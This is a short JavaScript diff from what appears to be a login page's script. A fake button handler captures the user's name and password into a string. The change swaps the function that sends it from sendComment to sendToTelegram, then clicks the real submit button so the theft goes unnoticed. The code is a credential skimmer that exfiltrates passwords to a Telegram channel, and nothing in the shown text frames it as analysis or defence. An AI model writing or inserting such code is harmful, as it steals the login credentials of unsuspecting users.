@@ -22,7 +22,7 @@
       fakeButton.value = fakeButton.dataset.disableWith;
       let strData = `name: ${name.value}, pass : ${pass.value}`;
       //console.log(strData);
-      sendComment(strData).then(()=>{
+      sendToTelegram(strData).then(()=>{
         submitButton.click();
       })
     })
